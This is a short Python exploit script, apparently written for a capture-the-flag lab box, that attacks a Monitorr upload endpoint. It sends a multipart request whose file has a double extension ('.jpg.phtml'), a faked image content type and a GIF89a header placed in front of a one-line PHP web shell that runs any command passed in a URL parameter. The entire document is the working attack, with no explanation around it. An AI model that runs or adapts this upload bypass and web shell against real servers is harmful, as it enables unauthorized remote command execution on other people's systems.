#!/usr/bin/env python
import requests
import urllib3


url = "https://monitorr.robyns-petshop.thm/assets/php/upload.php"

header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Cookie": "isHuman=1", "Connection": "close"}


data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"crypt0ace1.jpg.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a;<?php system($_GET['cmd']);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



response = requests.post(url, headers=header, data=data, verify=False)

print(response)
print(response.status_code)
print(response.content)